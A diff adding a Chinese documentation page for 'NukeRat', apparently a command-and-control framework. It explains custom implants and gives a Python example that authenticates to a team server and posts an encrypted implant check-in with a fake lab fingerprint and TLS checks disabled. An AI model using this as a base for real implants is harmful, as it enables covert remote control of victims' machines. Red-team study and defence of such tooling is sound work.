@@ -1,0 +1,102 @@
+---
+title: 自定义植入体
+---
+
+有时你需要从零编写植入体以满足特定需求。此时可以使用 NukeRat 的植入体 API。
+
+## 工作原理
+
+先说明一点：在默认 HTTP 通道上，植入体与 listener 管理的 REST API 通信。植入体通过该 API 拉取任务并回传输出。
+
+请参阅 [植入体 API](/docs/rest-api/implants) 文档，为自定义植入体实现通信层。
+
+## 示例
+
+下面是与 NukeRat 植入体 API 交互的简化示例。完整示例见 [nukeratframework/api](https://github.com/nukeratframework/api/blob/main/example/implant_example.py) 仓库。
+
+```python
+import json
+import requests
+import urllib3
+from implant.aes import build_implant_body
+
+operator_key = ''
+aes_key = ''
+team_server_url = 'http://192.168.15.21:9000'
+implant_listener_url = 'http://192.168.15.21:9090'
+listener_response_template = ''
+
+urllib3.disable_warnings()
+
+def implant_example(command):
+    """
+    示例：创建与服务通信的 AES 密钥，并向服务器发送指纹识别。
+    流程与植入体相同，区别在于 AES 密钥在编译时生成。
+    """
+    global aes_key
+    user, password, secret = operator_key.split(':', 2)
+    base = team_server_url.rstrip('/')
+    token = requests.post(
+        f'{base}/auth/login',
+        json={'user': user, 'pass': password, 'secret': secret},
+        verify=False,
+    ).json()['access_token']
+
+    headers = {'Authorization': f'Bearer {token}'}
+
+    if not aes_key:
+        aes_key = requests.post(
+            f'{base}/api/aes/create',
+            json={},
+            headers=headers,
+            verify=False,
+        ).json()['aesKey']
+
+    body = build_implant_body(
+        aes_key,
+        {
+            'option': 'new',
+            'tag': 'demo01',
+            'ip': '',
+            'external_ip': '',
+            'hostname': 'fake-fp',
+            'user': 'lab',
+            'arch': 'x64',
+            'pid': 1,
+            'os': 'windows',
+            'listener': 'http',
+            'delay': 2,
+            'notes': command,
+            'implant_config': {
+                'channel': 'http',
+                'host': '127.0.0.1',
+                'port': '9090',
+                'host_tag': 'demo01',
+                'delay': 2,
+            },
+            'metadata': {
+                'relays': [],
+                'privilege': 'default',
+                'internal_ip': '127.0.0.1',
+                'host': '127.0.0.1',
+                'port': '9090',
+            },
+        },
+    )
+    response = requests.post(
+        implant_listener_url.rstrip('/') + '/',
+        data=body,
+        headers={'Content-Type': 'application/octet-stream'},
+        verify=False,
+    )
+
+    return response.status_code
+
+
+if __name__ == '__main__':
+    print(implant_example('probe'))
+```
+
+## 自定义通道
+
+若通信方式不是默认 HTTP 通道，需要配置自定义通道。请参阅 [自定义通道](/docs/custom-channels) 了解具体做法。
